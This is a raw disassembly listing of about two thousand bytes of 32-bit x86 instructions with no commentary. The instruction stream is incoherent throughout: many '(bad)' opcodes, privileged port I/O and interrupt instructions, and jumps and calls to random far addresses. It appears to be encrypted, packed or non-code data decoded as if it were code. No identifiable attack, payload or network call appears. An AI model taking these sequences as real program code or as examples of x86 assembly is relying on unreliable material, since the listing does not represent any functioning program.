  401d35:	call   0xca4bf51d
  401d3a:	or     dl,bl
  401d3c:	repz loop 0x401d36
  401d3f:	loop   0x401cf7
  401d41:	lods   eax,DWORD PTR ds:[esi]
  401d42:	shr    DWORD PTR [ecx+ebx*8-0x1144851],cl
  401d49:	mov    edi,0xfffbfaf2
  401d4e:	out    dx,eax
  401d4f:	loope  0x401d4e
  401d51:	shl    esi,0xb
  401d54:	rcr    dl,cl
  401d56:	cli    
  401d57:	or     DWORD PTR [ebx],eax
  401d59:	in     al,dx
  401d5a:	fldz   
  401d5c:	add    eax,0xa4d1a8c7
  401d61:	(bad)  
  401d62:	mov    al,0xf7
  401d64:	mov    dl,0xca
  401d66:	mov    ch,0xbb
  401d68:	aad    0xc5
  401d6a:	lock jmp 0xc7f2:0xfcc3bbc3
  401d72:	add    bl,dl
  401d74:	retf   
  401d75:	fsubr  st,st(2)
  401d77:	out    dx,al
  401d78:	sti    
  401d79:	leave  
  401d7a:	add    ecx,edi
  401d7c:	int3   
  401d7d:	leave  
  401d7e:	call   0xad270b75
  401d83:	aad    0xd7
  401d85:	(bad)
  401d88:	aad    0xee
  401d8a:	cmc    
  401d8b:	int3   
  401d8c:	mov    edi,0xccd9cdbc
  401d91:	ffree  st(4)
  401d93:	stc    
  401d94:	sti    
  401d95:	clc    
  401d96:	fadd   st,st(1)
  401d98:	push   cs
  401d99:	call   0xe30b3178
  401d9e:	xlat   BYTE PTR ds:[ebx]
  401d9f:	loope  0x401d85
  401da1:	scas   eax,DWORD PTR es:[edi]
  401da2:	aad    0xd4
  401da4:	in     eax,0xc6
  401da6:	leave  
  401da7:	lock into 
  401da9:	retf   0xccd2
  401dac:	(bad)  
  401dae:	ret    
  401daf:	into   
  401db0:	icebp  
  401db1:	stc    
  401db2:	fcmovu st,st(2)
  401db4:	rcl    ebp,1
  401db6:	fcmovu st,st(3)
  401db8:	out    dx,eax
  401db9:	out    dx,eax
  401dba:	in     eax,dx
  401dbb:	cld    
  401dbc:	fldcw  WORD PTR [edx-0x1e15331c]
  401dc2:	out    dx,eax
  401dc3:	lods   al,BYTE PTR ds:[esi]
  401dc4:	mov    edx,0xcfe7f8e0
  401dc9:	mov    ebx,0xf2cfd6b9
  401dce:	hlt    
  401dcf:	(bad)  
  401dd0:	fnclex 
  401dd2:	(bad)  
  401dd4:	or     ecx,ebp
  401dd6:	lock in al,0xa
  401dd9:	loopne 0x401dce
  401ddb:	in     eax,0x12
  401ddd:	stos   DWORD PTR es:[edi],eax
  401dde:	shl    bh,0xe1
  401de1:	loope  0x401dd3
  401de3:	(bad)  
  401de4:	icebp  
  401de5:	leave  
  401de6:	mov    eax,0xf4d2cdb7
  401deb:	mov    ah,0xc3
  401ded:	mov    edx,0x7bff6ba
  401df2:	cli    
  401df3:	stc    
  401df4:	retf   
  401df5:	add    dh,bh
  401df7:	inc    esi
  401df9:	add    bl,ch
  401dfb:	push   cs
  401dfc:	or     dl,dl
  401dfe:	jmp    0xf80b03ab
  401e03:	int    0xf9
  401e05:	in     eax,0xf2
  401e07:	mov    edi,0xecc9fadb
  401e0c:	fidivr WORD PTR [edx-0x1f110a0c]
  401e12:	int3   
  401e13:	hlt    
  401e14:	neg    dh
  401e16:	rcr    bl,1
  401e18:	or     dh,bl
  401e1a:	out    0xc4,eax
  401e1c:	pmaxsw mm7,QWORD PTR [edx+eax*8-0x35433639]
  401e24:	mov    al,0xef
  401e26:	out    0xca,al
  401e28:	cmc    
  401e29:	clc    
  401e2a:	mov    dh,0xeb
  401e2c:	aad    0xd5
  401e2e:	sar    eax,0x1
  401e31:	lock hlt 
  401e33:	cmc    
  401e34:	std    
  401e35:	lock cld 
  401e37:	(bad)  
  401e39:	out    0xe4,al
  401e3b:	int    0x13
  401e3d:	fadd   st(6),st
  401e3f:	in     eax,dx
  401e40:	ffree  st(4)
  401e42:	ror    dh,0xd3
  401e45:	sti    
  401e46:	int3   
  401e47:	icebp  
  401e48:	lods   al,BYTE PTR ds:[esi]
  401e49:	mov    ebx,0xe1d5dfeb
  401e4e:	mov    dh,0xf9
  401e50:	add    bh,ah
  401e52:	lock or al,BYTE PTR [esi]
  401e55:	or     ebp,ecx
  401e57:	jmp    0xb9ee:0x3d800db
  401e5e:	shl    DWORD PTR [ebp-0x3e370b51],cl
  401e64:	mov    ch,0xfb
  401e66:	call   0xcf121e54
  401e6b:	neg    ebp
  401e6d:	cmc    
  401e6e:	enter  0xe2c0,0xdf
  401e72:	add    bl,dl
  401e74:	fld    QWORD PTR [edx]
  401e76:	or     DWORD PTR [ecx],ecx
  401e78:	(bad)  
  401e79:	fld    st(5)
  401e7b:	add    ch,bh
  401e7d:	repnz out 0xe1,al
  401e80:	aad    0xad
  401e82:	imul   ebp
  401e84:	mov    dh,0xf0
  401e86:	mov    esi,0xc9eeb7c8
  401e8c:	xlat   BYTE PTR ds:[ebx]
  401e8d:	mul    bl
  401e8f:	into   
  401e90:	icebp  
  401e91:	aad    0xd3
  401e93:	icebp  
  401e94:	add    ecx,edi
  401e96:	std    
  401e97:	cld    
  401e98:	fsub   st(0),st
  401e9a:	loop   0x401e7c
  401e9c:	add    dh,ch
  401e9e:	mul    esi
  401ea0:	out    0xc7,al
  401ea2:	loopne 0x401e8d
  401ea4:	in     eax,dx
  401ea5:	div    eax
  401ea7:	(bad)  
  401ea8:	cli    
  401ea9:	(bad)  
  401eab:	into   
  401eac:	loope  0x401e77
  401eae:	out    dx,eax
  401eaf:	mov    eax,0xdef0bfec
  401eb4:	jecxz  0x401e8d
  401eb6:	fsubr  st(3),st
  401eb8:	loop   0x401e7e
  401eba:	loope  0x401eba
  401ebc:	int    0xb9
  401ebe:	call   0xd52dedb0
  401ec3:	loop   0x401eb0
  401ec5:	mov    dl,0xd1
  401ec7:	mov    ah,0xf6
  401ec9:	in     al,0xfd
  401ecb:	aam    0xe8
  401ecd:	add    al,BYTE PTR [eax]
  401ecf:	add    al,dl
  401ed1:	add    al,0xb
  401ed3:	shr    cl,0xe5
  401ed6:	or     ah,bh
  401ed8:	ror    BYTE PTR [ebx+ecx*1],0xe4
  401edc:	ffreep st(0)
  401ede:	in     eax,dx
  401edf:	scas   al,BYTE PTR es:[edi]
  401ee0:	in     eax,0xd3
  401ee2:	leave  
  401ee3:	mov    dl,0xfa
  401ee5:	(bad)  
  401ee6:	into   
  401ee7:	leave  
  401ee8:	iret   
  401ee9:	jmp    0xef130fb8
  401eee:	jmp    ecx
  401ef0:	fst    st(2)
  401ef2:	mov    BYTE PTR [ecx],0xf2
  401ef5:	out    0xfe,al
  401ef7:	add    esp,ebx
  401ef9:	or     ebx,esp
  401efb:	fucomip st,st(1)
  401efd:	retf   0xcdc6
  401f00:	not    esi
  401f02:	(bad)  
  401f03:	jecxz  0x401ec6
  401f05:	jmp    0xccd1:0xb5e6f6d7
  401f0c:	rcl    dh,1
  401f0e:	cmc    
  401f0f:	add    edx,ebp
  401f11:	hlt    
  401f12:	rol    ah,cl
  401f14:	push   es
  401f15:	or     edx,esp
  401f17:	push   es
  401f18:	stc    
  401f19:	fadd   QWORD PTR [edi]
  401f1b:	jmp    0xc8eeee2f
  401f20:	mov    bh,0xb3
  401f22:	lods   eax,DWORD PTR ds:[esi]
  401f23:	mov    dl,0xe5
  401f25:	aam    0xb7
  401f27:	clc    
  401f28:	fst    st(5)
  401f2a:	std    
  401f2b:	jmp    0xdf440dfe
  401f30:	xlat   BYTE PTR ds:[ebx]
  401f31:	fadd   st,st(0)
  401f33:	clc    
  401f34:	jmp    0xf62e1f3d
  401f39:	fsub   st,st(6)
  401f3b:	leave  
  401f3c:	in     eax,0xe9
  401f3e:	loop   0x401ef1
  401f40:	in     al,0xcf
  401f42:	rcl    dl,1
  401f44:	(bad)  
  401f45:	(bad)  
  401f46:	(bad)  
  401f47:	(bad)  
  401f48:	int    0xf9
  401f4a:	iret   
  401f4b:	fsub   st(1),st
  401f4d:	mov    edx,0xd1e3f2bd
  401f52:	aad    0xd8
  401f54:	or     dh,ah
  401f56:	(bad)  
  401f58:	out    dx,al
  401f59:	(bad)  
  401f5a:	cli    
  401f5b:	push   cs
  401f5c:	call   eax
  401f5e:	imul   DWORD PTR [ecx-0x324d0b1d]
  401f64:	in     eax,0xda
  401f66:	jmp    0xfefe1a59
  401f6b:	xlat   BYTE PTR ds:[ebx]
  401f6c:	int3   
  401f6d:	in     eax,dx
  401f6e:	shl    ebp,1
  401f70:	mov    eax,0xd9f3f7f3
  401f75:	mul    ebx
  401f77:	aad    0xe7
  401f79:	or     al,0xed
  401f7b:	(bad)  
  401f7d:	jmp    0xc6f7:0xe5b6b7bd
  401f84:	hlt    
  401f85:	lock sti 
  401f87:	fnstcw WORD PTR [esi-0x29262026]
  401f8d:	int3   
  401f8e:	fucomp st(7)
  401f90:	sar    DWORD PTR [ebp+edi*4+0x4c6ebe5],1
  401f97:	or     bl,ch
  401f99:	or     ecx,esp
  401f9b:	out    0xc0,al
  401f9d:	in     al,dx
  401f9e:	int    0xad
  401fa0:	loope  0x401f6a
  401fa2:	lock int 0xc4
  401fa5:	rcl    cl,cl
  401fa7:	int3   
  401fa8:	rcl    ch,cl
  401faa:	(bad)  
  401fac:	jmp    0xc73efd80
  401fb1:	aad    0xff
  401fb3:	ret    0x607
  401fb6:	test   ebx,0xdc9cdc9
  401fbc:	leave  
  401fbd:	scas   al,BYTE PTR es:[edi]
  401fbe:	jmp    0xccb7:0xadb5e4c1
  401fc5:	mov    ebx,0xf8fbdacf
  401fca:	shr    bl,1
  401fcc:	iret   
  401fcd:	mov    edi,0xc1c2dede
  401fd2:	shl    bl,cl
  401fd4:	retf   
  401fd5:	rcl    ch,1
  401fd7:	jmp    esp
  401fd9:	jmp    0xe141e1a7
  401fde:	loop   0x401fae
  401fe0:	cmc    
  401fe1:	aad    0xe2
  401fe3:	hlt    
  401fe4:	repnz rcr dl,0xf6
  401fe8:	(bad)  
  401fe9:	clc    
  401fea:	les    edi,FWORD PTR [edx-0xc122713]
  401ff0:	in     eax,dx
  401ff1:	shr    ebx,cl
  401ff3:	mov    esp,0xe4eff902
  401ff8:	loope  0x401fcf
  401ffa:	add    esp,edi
  401ffc:	jecxz  0x401fc1
  401ffe:	stos   BYTE PTR es:[edi],al
  401fff:	shl    ecx,cl
  402001:	shr    edx,cl
  402003:	fidiv  DWORD PTR [esi-0x42d4851]
  402009:	mov    bl,0xc8
  40200b:	call   0xe012fdf2
  402010:	fcmovu st,st(5)
  402012:	repz lock fadd st(1),st
  402016:	out    0xe8,al
  402018:	(bad)  
  402019:	out    dx,eax
  40201a:	in     al,0xed
  40201c:	(bad)  
  40201d:	jmp    0xf60ae001
  402022:	retf   
  402023:	ret    
  402024:	mov    ch,0xcf
  402026:	fucomip st,st(4)
  402028:	mov    esi,0xe1b9feff
  40202d:	leave  
  40202e:	int    0xbd
  402030:	out    dx,al
  402031:	neg    ebp
  402033:	add    ebx,esp
  402035:	loope  0x40202c
  402037:	clc    
  402038:	sti    
  402039:	fcmovnu st,st(6)
  40203b:	fmulp  st(3),st
  40203d:	call   0xf3f40502
  402042:	int    0xb1
  402044:	retf   
  402045:	rcr    edi,0xc5
  402048:	jmp    0x402044
  40204a:	retf   0xf6ef
  40204d:	not    bl
  40204f:	fmul   st(5),st
  402051:	(bad)  
  402052:	rol    eax,0x2
  402055:	add    DWORD PTR [edx],ecx
  402057:	jmp    0x40205b
  402059:	add    eax,0xebffe807
  40205e:	jmp    0xf9ef:0xe7adf5c7
  402065:	mov    bh,0xe0
  402067:	mov    edx,0xdbdafbda
  40206c:	clc    
  40206d:	(bad)  
  40206f:	add    ebp,ebx
  402071:	out    0xe5,al
  402073:	repz jmp 0xc742087a
  402079:	in     al,0xd9
  40207b:	jmp    0xdef8d352
  402080:	loopne 0x402068
  402082:	sti    
  402083:	(bad)  
  402084:	int3   
  402085:	(bad)
  402088:	call   0xe2310062
  40208d:	rcr    ch,1
  40208f:	fucomi st,st(5)
  402091:	(bad)  
  402092:	fcmovbe st,st(4)
  402094:	sti    
  402095:	(bad)  
  402096:	std    
  402097:	add    bh,ah
  402099:	fisttp DWORD PTR [ebx]
  40209b:	les    eax,FWORD PTR [edi]
  40209d:	jecxz  0x40207e
  40209f:	jmp    0xcde7:0xd6e9d6d6
  4020a6:	(bad)  
  4020a8:	int    0xca
  4020aa:	cld    
  4020ab:	mov    esp,0xd0f7eded
  4020b0:	stc    
  4020b1:	loope  0x402095
  4020b3:	pop    es
  4020b4:	cli    
  4020b5:	xlat   BYTE PTR ds:[ebx]
  4020b6:	fadd   QWORD PTR [ecx+ebp*8]
  4020b9:	push   cs
  4020ba:	int3   
  4020bb:	clc    
  4020bc:	fucom  st(5)
  4020be:	mov    esi,0xf5cfcbdf
  4020c3:	shl    edi,0xba
  4020c6:	div    DWORD PTR [ebp-0x282f0e17]
  4020cc:	jecxz  0x4020d1
  4020ce:	fmulp  st(6),st
  4020d0:	out    dx,al
  4020d1:	loope  0x4020b7
  4020d3:	xlat   BYTE PTR ds:[ebx]
  4020d4:	aad    0xf9
  4020d6:	aad    0xfe
  4020d8:	faddp  st(5),st
  4020da:	fcomp  st(2)
  4020dc:	in     eax,0xe0
  4020de:	rol    dl,cl
  4020e0:	repnz mov bh,0xd4
  4020e3:	hlt    
  4020e4:	shr    edx,0xb5
  4020e7:	leave  
  4020e8:	fdiv   st,st(5)
  4020ea:	repz mov ah,0xc2
  4020ed:	not    al
  4020ef:	add    ebx,edi
  4020f1:	rcr    eax,cl
  4020f3:	out    0xc1,al
  4020f5:	add    al,0xda
  4020f7:	idiv   cl
  4020f9:	jmp    0xd20b0dd2
  4020fe:	jmp    0x4020a8
  402100:	ffree  st(1)
  402102:	into   
  402103:	leave  
  402104:	(bad)  
  402105:	xlat   BYTE PTR ds:[ebx]
  402106:	repz into 
  402108:	mov    ebx,0xb4f7cdcf
  40210d:	into   
  40210e:	xlat   BYTE PTR ds:[ebx]
  40210f:	sti    
  402110:	fcmovu st,st(5)
  402112:	not    eax
  402114:	loopne 0x4020df
  402116:	cli    
  402117:	in     eax,0xd4
  402119:	add    al,0xe9
  40211b:	retf   0xe912
  40211e:	scas   eax,DWORD PTR es:[edi]
  40211f:	shr    BYTE PTR [esi-0x4c2f1b52],0xec
  402126:	out    0xad,al
  402128:	rol    ah,1
  40212a:	jmp    0x402121
  40212c:	cli    
  40212d:	iret   
  40212e:	mov    eax,0xbeddf2f5
  402133:	ret    0xc1db
  402136:	fdivp  st(0),st
  402138:	aam    0xe1
  40213a:	int3   
  40213b:	call   0xed24e90b
  402140:	mov    esp,0xf2b2d0c5
  402145:	shl    esi,1
  402147:	mov    edi,0xbfcddeef
  40214c:	clc    
  40214d:	fdiv   st,st(5)
  40214f:	xlat   BYTE PTR ds:[ebx]
  402150:	out    0xdd,al
  402152:	out    0xdb,al
  402154:	neg    ebx
  402156:	stc    
  402157:	fisttp WORD PTR [eax]
  402159:	into   
  40215a:	fisttp DWORD PTR [ebx]
  40215c:	retf   
  40215d:	shr    ebp,cl
  40215f:	jmp    0xd8ee:0xe6b7e7dd
  402166:	rol    ebp,cl
  402168:	int3   
  402169:	cli    
  40216a:	in     al,0xda
  40216c:	ret    
  40216d:	cld    
  40216e:	fucom  st(7)
  402170:	stc    
  402171:	(bad)  
  402172:	jmp    0x40213b
  402174:	or     edx,ebp
  402176:	cld    
  402177:	cli    
  402178:	add    eax,0xc0f20102
  40217d:	(bad)
  402181:	jmp    0x402165
  402183:	out    dx,eax
  402184:	leave  
  402185:	out    dx,al
  402186:	lock fcmovne st,st(4)
  402189:	out    dx,al
  40218a:	cli    
  40218b:	jmp    0xd6f9125e
  402190:	repnz in al,0xdd
  402193:	mov    esp,0x701deff
  402198:	retf   0xd9ef
  40219b:	jecxz  0x402187
  40219d:	into   
  40219e:	mov    edi,0xc7d6ebe9
  4021a3:	retf   0xf0c1
  4021a6:	mov    ah,0xee
  4021a8:	mov    eax,0xf4cabec8
  4021ad:	mov    ebp,0xe3f4fcc3
  4021b2:	fnstsw WORD PTR [ebp-0x3efe072e]
  4021b8:	out    0xce,eax
  4021ba:	add    esp,ebp
  4021bc:	retf   0xdfe0
  4021bf:	loope  0x402188
  4021c1:	int    0xe3
  4021c3:	ror    edx,0xeb
  4021c6:	mov    ah,0xb7
  4021c8:	mov    esi,0xec03eaef
  4021cd:	add    ebx,ebx
  4021cf:	jmp    edx
  4021d1:	lock pop es
  4021d3:	shl    dh,0xbf
  4021d6:	add    BYTE PTR [edx],cl
  4021d8:	add    DWORD PTR [ecx],eax
  4021da:	out    dx,al
  4021db:	push   es
  4021dc:	cld    
  4021dd:	out    0xee,al
  4021df:	scas   al,BYTE PTR es:[edi]
  4021e0:	scas   eax,DWORD PTR es:[edi]
  4021e1:	int    0xf1
  4021e3:	loopne 0x40219a
  4021e5:	int    0xc7
  4021e7:	repz (bad) 
  4021e9:	sar    edx,cl
  4021eb:	fcmove st,st(2)
  4021ed:	hlt    
  4021ee:	ret    
  4021ef:	test   bl,0xf9
  4021f2:	rcr    eax,cl
  4021f4:	fistp  QWORD PTR [edi+0x9e3bdca]
  4021fa:	add    BYTE PTR [eax],cl
  4021fc:	int    0xbd
  4021fe:	mov    edi,0xdbe3d1a5
  402203:	sar    ebx,cl
  402205:	mov    dh,0xfb
  402207:	mov    ebx,0xfdf9b7b5
  40220c:	shr    cl,1
  40220e:	int3   
  40220f:	jecxz  0x40220c
  402211:	in     eax,dx
  402212:	add    DWORD PTR [ebp-0x37183835],edi
  402218:	stc    
  402219:	add    edx,DWORD PTR [ebx]
  40221b:	pop    es
  40221c:	retf   
  40221d:	(bad)  
  40221f:	mov    cl,0xb7
  402221:	scas   al,BYTE PTR es:[edi]
  402222:	lock jmp 0x4021f8
  402225:	mov    bh,0xb0
  402227:	cli    
  402228:	iret   
  402229:	jmp    0xc0fa:0xf2eef2ea
  402230:	repnz (bad) 
  402232:	fcmovbe st,st(2)
  402234:	in     eax,0xc1
  402236:	fisttp WORD PTR [ecx]
  402238:	fsubp  st(5),st
  40223a:	pextrw eax,mm4,0xc3
  40223e:	mov    eax,0xb6ccb3e0
  402243:	mov    dl,0xd4
  402245:	into   
  402246:	jmp    0x4021ff
  402248:	jmp    0xfbd5:0xf0c9d7bf
  40224f:	(bad)  
  402250:	sti    
  402251:	in     eax,0xf2
  402253:	shl    ah,1
  402255:	ret    0x6f4
  402258:	aad    0xe1
  40225a:	add    esp,ebp
  40225c:	int3   
  40225d:	jmp    0xde080a43
  402262:	leave  
  402263:	(bad)  
  402264:	iret   
  402265:	mov    al,0xff
  402267:	out    0xed,eax
  402269:	ffreep st(4)
  40226b:	icebp  
  40226c:	xlat   BYTE PTR ds:[ebx]
  40226d:	iret   
  40226e:	int    0xb8
  402270:	rcr    ecx,cl
  402272:	mov    edx,0xdebff7c1
  402277:	fdivrp st(6),st
  402279:	sti    
  40227a:	leave  
  40227b:	cld    
  40227c:	fadd   st,st(1)
  40227e:	mov    edi,0xe5eee7bc
  402283:	icebp  
  402284:	lds    edi,FWORD PTR [ecx-0x40450a33]
  40228a:	std    
  40228b:	in     al,dx
  40228c:	leave  
  40228d:	(bad)  
  40228e:	mov    dh,0x2
  402290:	cld    
  402291:	call   esp
  402293:	rcr    dl,1
  402295:	leave  
  402296:	clc    
  402297:	clc    
  402298:	out    dx,al
  402299:	cli    
  40229a:	clc    
  40229b:	push   cs
  40229c:	shl    ecx,cl
  40229e:	repz iret 
  4022a0:	jmp    0xfb240389
  4022a5:	(bad)  
  4022a6:	idiv   BYTE PTR [edx-0x3223450d]
  4022ac:	(bad)  
  4022ae:	xlat   BYTE PTR ds:[ebx]
  4022af:	test   esi,0xebeabe03
  4022b5:	clc    
  4022b6:	add    bh,dl
  4022b8:	prefetchw (bad)
  4022b9:	or     eax,0xbe09d3cf
  4022be:	imul   esp
  4022c0:	ret    0xd2e3
  4022c3:	neg    cl
  4022c5:	fcmovne st,st(4)
  4022c7:	icebp  
  4022c8:	in     al,0xd4
  4022ca:	aam    0xdd
  4022cc:	int3   
  4022cd:	fucomip st,st(6)
  4022cf:	add    edx,esp
  4022d1:	cld    
  4022d2:	push   es
  4022d3:	fimul  WORD PTR [ebx]
  4022d5:	(bad)  
  4022d7:	(bad)  
  4022d8:	clc    
  4022d9:	dec    DWORD PTR [edx]
  4022db:	in     al,0x13
  4022dd:	test   eax,0xd0a4cdaf
  4022e2:	out    dx,eax
  4022e3:	ret    
  4022e4:	call   0xf4321dcf
  4022e9:	clc    
  4022ea:	icebp  
  4022eb:	iret   
  4022ec:	out    dx,al
  4022ed:	clc    
  4022ee:	fld    DWORD PTR [edi]
  4022f0:	rcr    ebp,1
  4022f2:	jmp    0x4022d6
  4022f4:	jecxz  0x4022f3
  4022f6:	(bad)  
  4022f7:	add    eax,0xc2ffc5
  4022fc:	add    al,0xf1
  4022fe:	mov    al,0xf1
  402300:	retf   0xd5e9
  402303:	mov    bl,0xba
  402305:	fnstcw WORD PTR [ecx-0x935342d]
  40230b:	stc    
  40230c:	rcl    edx,cl
  40230e:	enter  0xd6b8,0xfb
  402312:	add    eax,0xe0db03e0
  402317:	fld    DWORD PTR [eax]
  402319:	call   0xe849fc2a
  40231e:	loop   0x4022e4
  402320:	int    0xd1
  402322:	cmc    
  402323:	(bad)  
  402324:	out    dx,al
  402325:	retf   0xc6ef
  402328:	sti    
  402329:	int3   
  40232a:	out    dx,eax
  40232b:	mov    edi,0xd1dadfee
  402330:	mov    esi,0xc5d4fe03
  402335:	pop    es
  402336:	(bad)  
  402337:	fdiv   st(6),st
  402339:	fsub   st(5),st
  40233b:	add    al,bh
  40233d:	test   eax,0xcbe2f0f3
  402342:	scas   al,BYTE PTR es:[edi]
  402343:	(bad)  
  402344:	into   
  402345:	out    dx,eax
  402346:	retf   0xd5d5
  402349:	ror    dl,cl
  40234b:	(bad)  
  40234c:	in     eax,dx
  40234d:	cmc    
  40234e:	iret   
  40234f:	fadd   st(1),st
  402351:	(bad)
  402354:	ret    0xc005
  402357:	std    
  402358:	test   BYTE PTR ds:0xf306e502,0xca
  40235f:	test   al,0xd3
  402361:	ret    0xd5f4
  402364:	out    0xb3,eax
  402366:	fistp  QWORD PTR [edi-0x27052706]
  40236c:	aad    0xb9
  40236e:	in     eax,dx
  40236f:	pop    es
  402370:	fcmovnu st,st(3)
  402372:	loop   0x402368
  402374:	repnz out 0xa,eax
  402377:	add    edi,ecx
  402379:	jmp    0xd92b0b76
  40237e:	out    dx,al
  40237f:	mul    DWORD PTR [edi+ebp*8-0x71e1930]
  402386:	shl    DWORD PTR [eax-0x4e353733],1
  40238c:	mov    eax,0xf2fcc8f3
  402391:	add    eax,ecx
  402393:	(bad)  
  402394:	out    0xc1,eax
  402396:	ffreep st(1)
  402398:	mov    esp,0xe80706fe
  40239d:	mov    eax,0xcccfd3e8
  4023a3:	mul    cl
  4023a5:	in     al,0xd4
  4023a7:	retf   0xfdf5
  4023aa:	jmp    0xe41f18a0
  4023af:	out    dx,al
  4023b0:	(bad)  
  4023b2:	repz loopne 0x40237c
  4023b5:	leave  
  4023b6:	enter  0x4e4,0xe6
  4023ba:	add    DWORD PTR [ecx],ecx
  4023bc:	add    esp,esp
  4023be:	mov    al,0xbf
  4023c0:	fucom  st(4)
  4023c2:	int    0xbb
  4023c4:	ror    edi,0xb9
  4023c7:	jmp    0xe0db:0xcbbbdcc6
  4023ce:	sti    
  4023cf:	add    al,BYTE PTR [eax]
  4023d1:	fld    DWORD PTR [edi]
  4023d3:	rol    ebp,0xf4
  4023d6:	(bad)  
  4023d7:	jmp    0xe81ef9cb
  4023dc:	rol    cl,cl
  4023de:	mov    edi,0xaef3b7ad
  4023e3:	imul   DWORD PTR [edi+esi*4-0x23481612]
  4023ea:	jmp    0xc3e1:0xd8cfd1be
  4023f1:	fild   WORD PTR [eax]
  4023f3:	fiadd  DWORD PTR [ebx]
  4023f5:	cmc    
  4023f6:	fucomip st,st(6)
  4023f8:	idiv   dl
  4023fa:	enter  0x5fb,0xeb
  4023fe:	ret    0xb3ef
  402401:	mov    bh,0xeb
  402403:	retf   
  402404:	rcr    cl,1
  402406:	(bad)  
  402407:	fcmove st,st(1)
  402409:	in     eax,0xc4
  40240b:	fidivr WORD PTR [esp+ebp*8-0x2e382d14]
  402412:	pop    es
  402413:	fsubrp st(6),st
  402415:	retf   0xc50b
  402418:	(bad)  
  402419:	jmp    0xb0c1:0xc1d900e3
  402420:	mov    bl,0xb2
  402422:	ret    
  402423:	mov    cl,0xd0
  402425:	jmp    0xfbd0:0xb4d1f7df
  40242c:	neg    dl
  40242e:	add    cl,dh
  402430:	rcr    ch,1
  402432:	aam    0xe3
  402434:	(bad)  
  402436:	add    eax,edi
  402438:	fild   WORD PTR [ecx+ebp*8]
  40243b:	fst    st(2)
  40243d:	mov    ecx,0xdccaf1bc
  402442:	in     al,0xd7
  402444:	loopne 0x40241b
  402446:	icebp  
  402447:	iret   
  402448:	xlat   BYTE PTR ds:[ebx]
  402449:	int3   
  40244a:	xlat   BYTE PTR ds:[ebx]
  40244b:	retf   0xfbe3
  40244e:	mov    dh,0xf2
  402450:	fcmovbe st,st(6)
  402452:	loopne 0x40244d
  402454:	fneni(8087 only) 
  402456:	inc    BYTE PTR [esi]
  402458:	jmp    0xce0f0c43
  40245d:	jecxz  0x40244e
  40245f:	mov    al,0xcb
  402461:	loopne 0x40244c
  402463:	out    dx,eax
  402464:	jmp    0xcd04db3c
  402469:	(bad)  
  40246a:	ror    al,1
  40246c:	hlt    
  40246d:	sti    
  40246e:	repz rol esi,cl
  402471:	(bad)  
  402472:	(bad)  
  402474:	repnz lock or ebx,ebx
  402478:	stc    
  402479:	enter  0x2e7,0xdc
  40247d:	sar    DWORD PTR [eax-0x83a1d19],cl
  402483:	loop   0x402476
  402485:	mov    ch,0xe4
  402487:	enter  0xe4d5,0xb9
  40248b:	fdivr  st(4),st
  40248d:	loope  0x402462
  40248f:	mov    edx,0xd2e3c1f0
  402495:	aad    0xa
  402497:	(bad)  
  402498:	loopne 0x40245f
  40249a:	fucomip st,st(7)
  40249c:	jmp    0xef01cd79
  4024a1:	lods   al,BYTE PTR ds:[esi]
  4024a2:	(bad)  
  4024a3:	shl    BYTE PTR [eax-0x374f0a1b],cl
  4024a9:	mov    ebp,0xc2dde8f3
  4024ae:	loopne 0x40247c
  4024b0:	clc    
  4024b1:	mov    ebx,0x6fcea02
  4024b6:	(bad)  
  4024b7:	call   0xdf41ebb2
  4024bc:	or     al,0xe1
  4024be:	into   
  4024bf:	ret    
  4024c0:	loopne 0x40248c
  4024c2:	mov    dh,0xe2
  4024c4:	retf   
  4024c5:	call   0xea0b13bb
  4024ca:	cmc    
  4024cb:	(bad)  
  4024cd:	call   0xe70108bf
  4024d2:	in     eax,0xd2
  4024d4:	or     eax,esi
  4024d6:	hlt    
  4024d7:	or     al,BYTE PTR [ebx]
  4024d9:	(bad)  
  4024da:	out    0xdd,al
  4024dc:	cld    
  4024dd:	test   eax,0xd5eef3e6
  4024e2:	call   0xec18e7d5
  4024e7:	repz mov eax,0xc2d4c4c4
  4024ed:	cmc    
  4024ee:	add    bh,BYTE PTR [edi-0x21f42e08]
  4024f4:	or     bl,ah
  4024f6:	pop    es
  4024f7:	(bad)  
  4024f8:	jmp    0xd0a9:0xda0303d5
  4024ff:	shr    edi,cl
  402501:	loope  0x4024f9
  402503:	mov    al,0xeb
  402505:	(bad)  
  402507:	in     al,dx
  402508:	(bad)  
  402509:	dec    dl
  40250b:	fdivrp st(7),st
  40250d:	std    
  40250e:	call   0xe44600f3
  402513:	loopne 0x402516
  402515:	add    bh,dl
  402517:	std    
  402518:	cld    
  402519:	(bad)  
  40251a:	out    0xb,eax
  40251c:	add    dl,ah
  40251e:	loop   0x402503
  402520:	loope  0x4024eb
  402522:	lods   eax,DWORD PTR ds:[esi]
  402523:	(bad)  
  402524:	in     al,0xd2
  402526:	mov    eax,0xe4d9c5d4
  40252b:	aam    0xfd
  40252d:	mov    bh,0xf9
  40252f:	into   
  402530:	int3   
  402531:	(bad)
  402534:	faddp  st(6),st
  402536:	add    ch,ah
  402538:	out    0x0,al
  40253a:	fadd   DWORD PTR [eax]
  40253c:	out    dx,al
  40253d:	iret   
  40253e:	(bad)  
  40253f:	fstp   st(6)
  402541:	leave  
  402542:	in     al,dx
  402543:	mov    dh,0xb3
  402545:	xlat   BYTE PTR ds:[ebx]
  402546:	(bad)
  402549:	(bad)  
  40254b:	jecxz  0x40251e
  40254d:	add    ecx,ebp
  40254f:	lock in al,dx
  402551:	aad    0xfe
  402553:	fdivr  st(1),st
  402555:	jmp    0xcffd:0xffe0101
  40255c:	into   
  40255d:	ftst   
  40255f:	out    dx,eax
  402560:	shr    DWORD PTR [ebx-0x34441038],1
  402566:	stc    
  402567:	div    BYTE PTR [ebx+edi*4-0x3c271421]
  40256e:	call   0xd8472d28
  402573:	not    edx
  402575:	or     al,BYTE PTR [ebx]
  402577:	loop   0x402557
  402579:	push   es
  40257a:	push   cs
  40257b:	leave  
  40257c:	jmp    0x402528
  40257e:	fmul   st(2),st
  402580:	rcl    eax,cl
  402582:	(bad)  
  402583:	aad    0xd7
  402585:	rcr    cl,0xbb
  402588:	out    dx,eax
  402589:	repz repnz shl ecx,1
  40258d:	mov    ebx,0xfdc6f1dc
  402592:	out    0x0,al
  402594:	idiv   edx
  402596:	out    0xfe,eax
  402598:	jmp    0xcd01f9a7
  40259d:	ror    bh,0xe3
  4025a0:	mov    cl,0xd4
  4025a2:	shl    esi,cl
  4025a4:	repz (bad) 
  4025a7:	shl    DWORD PTR [edi-0xb412124],1
  4025ad:	repnz iret 
  4025af:	in     al,dx
  4025b0:	(bad)  
  4025b2:	mov    esi,0xcaf9fbd7
  4025b7:	retf   
